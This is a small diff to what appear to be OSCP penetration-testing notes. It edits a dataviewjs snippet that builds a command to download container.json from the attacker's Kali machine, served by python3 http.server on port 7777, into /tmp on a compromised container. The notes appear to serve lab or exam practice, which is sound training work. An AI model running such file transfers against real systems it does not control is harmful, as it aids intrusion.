@@ -115,7 +115,7 @@ python3 -m http.server 7777
 
 Downloaded it inside the compromised container:
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `curl http://${KaliIP}:7777/container.json -o /tmp/container.json`;
 
